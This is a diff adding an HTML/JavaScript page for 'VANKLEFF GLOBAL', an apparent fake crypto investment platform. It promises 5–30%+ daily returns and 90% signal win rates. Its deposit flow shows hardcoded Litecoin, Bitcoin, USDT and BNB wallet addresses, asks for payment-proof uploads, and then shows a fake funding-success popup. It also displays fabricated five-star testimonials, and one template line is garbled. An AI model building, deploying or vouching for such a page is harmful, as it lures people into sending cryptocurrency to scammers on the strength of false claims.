@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>VANKLEFF GLOBAL</title>
+  <style>
+    :root {
+      --bg-primary: #0A0F1C;
+      --bg-secondary: #121A2B;
+      --bg-elevated: #182338;
+      --accent-primary: #5865F2;
+      --success: #17C964;
+      --text-primary: #FFFFFF;
+      --text-secondary: #9CA3AF;
+      --border: #2A3553;
+    }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--bg-primary);
+      color: var(--text-primary);
+      min-height: 100vh;
+      display: flex;
+      overflow-x: hidden;
+    }
+    #sidebar {
+      position: fixed;
+      left: 0;
+      top: 0;
+      bottom: 0;
+      width: 260px;
+      background: var(--bg-primary);
+      padding: 32px 24px;
+      overflow-y: auto;
+      z-index: 1000;
+      border-right: 1px solid var(--border);
+    }
+    #sidebar h2 {
+      color: var(--text-primary);
+      font-weight: 600;
+      text-align: center;
+      margin-bottom: 32px;
+    }
+    #sidebar a {
+      color: var(--text-secondary);
+      text-decoration: none;
+      display: block;
+      padding: 12px 16px;
+      border-radius: 12px;
+      margin: 4px 0;
+      transition: 0.2s;
+    }
+    #sidebar a:hover, #sidebar a.active {
+      background: var(--bg-elevated);
+      color: var(--text-primary);
+    }
+    @media (max-width: 768px) {
+      #sidebar { width: 220px; }
+    }
+    #main {
+      margin-left: 260px;
+      padding: 32px 24px;
+      flex: 1;
+    }
+    @media (max-width: 768px) {
+      #main { margin-left: 220px; }
+    }
+    .section {
+      display: none;
+    }
+    .section.active {
+      display: block;
+    }
+    header {
+      text-align: center;
+      padding: 48px 0 32px;
+    }
+    .globe { font-size: 70px; margin-bottom: 12px; }
+    .cta {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 40px 32px;
+      margin: 40px auto;
+      max-width: 720px;
+      text-align: center;
+    }
+    .cta button {
+      background: var(--success);
+      color: white;
+      border: none;
+      padding: 16px 32px;
+      border-radius: 12px;
+      font-weight: 600;
+      cursor: pointer;
+      animation: greenBlink 1.8s infinite ease-in-out;
+    }
+    @keyframes greenBlink {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(23,201,100,0.7); }
+      50% { box-shadow: 0 0 0 15px rgba(23,201,100,0); }
+    }
+    button {
+      background: var(--accent-primary);
+      color: white;
+      border: none;
+      padding: 14px 28px;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+    .qr-box {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 32px;
+      margin: 40px auto;
+      max-width: 460px;
+      text-align: center;
+    }
+    .qr-img {
+      width: 260px;
+      height: 260px;
+      margin: 0 auto 24px;
+      border: 8px solid #000;
+      border-radius: 12px;
+    }
+    .address {
+      font-family: monospace;
+      font-size: 1.15rem;
+      margin: 20px 0;
+      white-space: pre-line;
+    }
+    .warning {
+      background: rgba(245,158,11,0.1);
+      color: var(--warning);
+      padding: 16px;
+      border-radius: 12px;
+      margin-top: 24px;
+      font-weight: 500;
+    }
+    #success-popup {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.75);
+      z-index: 2000;
+      align-items: center;
+      justify-content: center;
+    }
+    .popup-content {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 40px;
+      text-align: center;
+      max-width: 460px;
+    }
+    .close-popup {
+      float: right;
+      cursor: pointer;
+      font-size: 2rem;
+      color: var(--text-muted);
+    }
+    .testimonial-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+      gap: 24px;
+      margin: 48px 0;
+    }
+    .testimonial-card {
+      background: var(--bg-elevated);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      padding: 28px;
+    }
+    .stars { color: #fbbf24; font-size: 1.4rem; margin-bottom: 16px; }
+  </style>
+</head>
+<body>
+
+<aside id="sidebar">
+  <h2>VANKLEFF GLOBAL</h2>
+  <ul>
+    <li><a href="#" onclick="switchSection('dashboard')" class="active">Dashboard</a></li>
+    <li><a href="#" onclick="switchSection('live')">Live Markets</a></li>
+    <li><a href="#" onclick="switchSection('copy')">Copy Trading</a></li>
+    <li><a href="#" onclick="switchSection('ai')">AI Bots</a></li>
+    <li><a href="#" onclick="switchSection('plans')">Plans</a></li>
+    <li><a href="#" onclick="switchSection('signals')">Signals</a></li>
+    <li><a href="#" onclick="switchSection('deposit')">Deposit</a></li>
+    <li><a href="#" onclick="switchSection('withdraw')">Withdraw</a></li>
+    <li><a href="#" onclick="switchSection('transfer')">Transfer</a></li>
+    <li><a href="#" onclick="switchSection('statement')">Statement</a></li>
+    <li><a href="#" onclick="switchSection('credit')">Credit – Apply Fast</a></li>
+    <li><a href="#" onclick="switchSection('account')">Account</a></li>
+    <li><a href="#" onclick="switchSection('growth')">Growth (Referral 5%)</a></li>
+    <li><a href="#" onclick="switchSection('support')">Support</a></li>
+  </ul>
+</aside>
+
+<main id="main">
+  <div id="dashboard" class="section active">
+    <header>
+      <div class="globe">🌍</div>
+      <h1>VANKLEFF GLOBAL</h1>
+      <p class="tagline">Your Gateway to Trading</p>
+    </header>
+
+    <div class="cta">
+      <h2>Connect Your Wallet & Enter the Profit Zone</h2>
+      <p>High-speed execution. Strategic market access. Built for traders who move fast.</p>
+      <button onclick="alert('Wallet connect simulation – opens modal with 50+ DEX wallets')">Connect Wallet</button>
+    </div>
+
+    <h2>Dashboard Overview</h2>
+    <p>Welcome back! Your current balance is $100.00</p>
+    <p>Recent activity: +$50 from referral bonus</p>
+  </div>
+
+  <div id="live" class="section">
+    <h2>Live Markets</h2>
+    <p>Real-time market data, charts, and trading pairs will be displayed here.</p>
+    <p>Current BTC price: $95,000 | ETH: $3,200 | LTC: $120</p>
+  </div>
+
+  <div id="copy" class="section">
+    <h2>Copy Trading</h2>
+    <p>Follow and copy top traders automatically.</p>
+    <p>Top performers this week: +28% ROI</p>
+  </div>
+
+  <div id="ai" class="section">
+    <h2>AI Bots</h2>
+    <p>Automated trading bots powered by AI.</p>
+    <p>Choose strategy: Scalping, Trend Following, Arbitrage</p>
+  </div>
+
+  <div id="plans" class="section">
+    <h2>Investment Plans</h2>
+    <p>Choose your plan and start earning daily returns.</p>
+    <ul>
+      <li><strong>Starter</strong> - Min $500, 5-8% daily</li>
+      <li><strong>Premium</strong> - Min $2,500, 10-15% daily</li>
+      <li><strong>Elite</strong> - Min $10,000, 18-25% daily</li>
+      <li><strong>VIP</strong> - Min $25,000, 30%+ daily</li>
+    </ul>
+  </div>
+
+  <div id="signals" class="section">
+    <h2>Premium Signals</h2>
+    <p>Receive high-accuracy trading signals.</p>
+    <p>90%+ win rate on Premium & VIP levels</p>
+    <p>Daily signals delivered via app or email</p>
+  </div>
+
+  <div id="deposit" class="section">
+    <h2>Deposit Funds</h2>
+    <div style="max-width:520px; margin:32px auto;">
+      <input type="number" min="500" placeholder="Amount (Min 500)" style="width:100%; padding:16px; margin:16px 0; border-radius:12px; border:1px solid var(--border); background:var(--bg-elevated); color:var(--text-primary); font-size:1.1rem;"/>
+      <div style="display:grid; grid-template-columns:repeat(2,1fr); gap:16px; margin:24px 0;">
+        <button onclick="showQR('ltc')">LTC</button>
+        <button onclick="showQR('usdt')">USDT BEP-20</button>
+        <button onclick="showQR('btc')">BTC</button>
+        <button onclick="showQR('bnb')">BNB</button>
+      </div>
+      <button style="width:100%; padding:18px; font-size:1.1rem;" onclick="document.getElementById('qr-page').style.display='block'">Continue</button>
+    </div>
+
+    <div id="qr-page" style="display:none; margin-top:48px;">
+      <div class="qr-box">
+        <h2>QR CODE</h2>
+        <img class="qr-img" src="https://api.qrserver.com/v1/create-qr-code/?size=260x260&data=ltc1q4lqt46g9998al7kneq9533s37w5xk6x63m39w6" alt="QR Code">
+        <div class="address" id="qr-address">ltc1q4lqt46g9998al7kneq9533s37w5x<br>k6x63m39w6</div>
+        <button onclick="copyAddress()">Copy Address</button>
+        <div class="warning" id="qr-warning">Only send Litecoin to this address.</div>
+      </div>
+
+      <div style="margin:32px auto; max-width:520px; text-align:center;">
+        <input type="file" accept="image/*" style="width:100%; padding:16px; margin:16px 0; background:var(--bg-elevated); color:var(--text-primary); border:1px solid var(--border); border-radius:12px;"/>
+        <button style="width:100%; padding:18px; font-size:1.1rem;" onclick="showSuccess()">Confirm & Upload Proof</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Other sections with basic content -->
+  <div id="withdraw" class="section">
+    <h2>Withdraw Funds</h2>
+    <p>Request withdrawal to your wallet.</p>
+    <p>Processing time: 1-24 hours</p>
+  </div>
+
+  <div id="transfer" class="section">
+    <h2>Transfer Funds</h2>
+    <p>Transfer between VANKLEFF accounts or external wallets.</p>
+  </div>
+
+  <div id="statement" class="section">
+    <h2>Transaction Statement</h2>
+    <p>View your full transaction history.</p>
+  </div>
+
+  <div id="credit" class="section">
+    <h2>Credit – Apply Fast</h2>
+    <p>Apply for instant credit boost.</p>
+  </div>
+
+  <div id="account" class="section">
+    <h2>Account Settings</h2>
+    <p>Update profile, security, and preferences.</p>
+  </div>
+
+  <div id="growth" class="section">
+    <h2>Growth (Referral 5%)</h2>
+    <p>Invite friends and earn 5% lifetime commission.</p>
+    <p>Your referral link: vankleff.global/ref/yourid</p>
+  </div>
+
+  <div id="support" class="section">
+    <h2>Support</h2>
+    <p>Contact our 24/7 support team.</p>
+    <p>Email: support@vankleff.global</p>
+  </div>
+
+  <section style="margin:64px 0;">
+    <h2 style="text-align:center; margin-bottom:32px;">Success Stories</h2>
+    <div class="testimonial-grid" id="testimonials"></div>
+  </section>
+</main>
+
+<div id="success-popup">
+  <div class="popup-content">
+    <span class="close-popup" onclick="document.getElementById('success-popup').style.display='none'">×</span>
+    <h2 style="color:var(--success);">Account Fund Successful!</h2>
+    <p>Please wait for system to validate this transaction.</p>
+  </div>
+</div>
+
+<script>
+function switchSection(sectionId) {
+  document.querySelectorAll('#sidebar a').forEach(a => a.classList.remove('active'));
+  document.querySelector(`a[onclick="switchSection('${sectionId}')"]`).classList.add('active');
+
+  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+  document.getElementById(sectionId).classList.add('active');
+}
+
+function showQR(coin) {
+  const addrMap = {
+    ltc: {addr:"ltc1q4lqt46g9998al7kneq9533s37w5x\nk6x63m39w6", warn:"Only send Litecoin to this address."},
+    usdt: {addr:"0x4000bAf1B2d5bbe78b6e56fDa21b1D3E4022C1Db", warn:"Only send USDT (BEP-20) to this address."},
+    btc: {addr:"bc1qy4s8k920xkfd50rurwuusuwvegh0ljw2dktddn", warn:"Only send Bitcoin to this address."},
+    bnb: {addr:"0x4000bAf1B2d5bbe78b6e56fDa21b1D3E4022C1Db", warn:"Only send BNB to this address."}
+  };
+  document.getElementById("qr-address").textContent = addrMap[coin].addr;
+  document.getElementById("qr-warning").textContent = addrMap[coin].warn;
+  document.getElementById("qr-page").style.display = "block";
+}
+
+function copyAddress() {
+  const text = document.getElementById("qr-address").textContent.replace(/\n/g,'');
+  navigator.clipboard.writeText(text).then(() => alert("Address copied!"));
+}
+
+function showSuccess() {
+  document.getElementById("success-popup").style.display = "flex";
+  setTimeout(() => document.getElementById("success-popup").style.display = "none", 8000);
+}
+
+const testimonials = [
+  {flag:"🇺🇸",name:"Jamal Washington",text:"Connected MetaMask instantly — now earning $2,800 daily!",stars:"★★★★★"},
+  {flag:"🇮🇹",name:"Sofia Bianchi",text:"Wallet connect took 5 seconds — $3,000/day unlocked!",stars:"★★★★★"},
+  {flag:"🇦🇺",name:"Liam Harper",text:"Seamless connect, daily profits started immediately!",stars:"★★★★★"},
+  {flag:"🇯🇵",name:"Hana Suzuki",text:"One-click wallet link — real daily earnings!",stars:"★★★★★"},
+  {flag:"🇸🇦",name:"Aisha Mohammed",text:"90%+ accurate signals — $18k last month!",stars:"★★★★★"},
+  {flag:"🇮🇳",name:"Priya Kapoor",text:"Premium signals spot-on — huge consistent profits!",stars:"★★★★★"},
+  {flag:"🇬🇭",name:"Kwesi Mensah",text:"Deposited $6k into Premium — 18% weekly returns!",stars:"★★★★★"},
+  {flag:"🇧🇷",name:"Maria Oliveira",text:"Easy deposit, VIP plan massive profits!",stars:"★★★★★"},
+  {flag:"🇺🇸",name:"James Miller",text:"Withdrew $25k profits — same day, secure!",stars:"★★★★★"},
+  {flag:"🇸🇬",name:"Sofia Chen",text:"Smooth withdrawal — funds in wallet hours!",stars:"★★★★★"},
+  {flag:"🇩🇪",name:"Hans Gruber",text:"Cashed out $18k easily — trustworthy!",stars:"★★★★★"}
+];
+
+function loadTestimonials() {
+  const container = document.getElementById("testimonials");
+  container.innerHTML = "";
+  const shuffled = [...testimonials].sort(() => Math.random() - 0.5);
+  shuffled.forEach(t => {
+    const card = document.createElement("div");
+    card.className = "testimonial-card";
+    card.innerHTML = `
+      <div class="stars">${t.stars}</div>
+      <p><strong>\( {t.flag} \){t.name}</strong></p>
+      <p>"${t.text}"</p>
+    `;
+    container.appendChild(card);
+  });
+}
+loadTestimonials();
+</script>
+
+</body>
+</html>
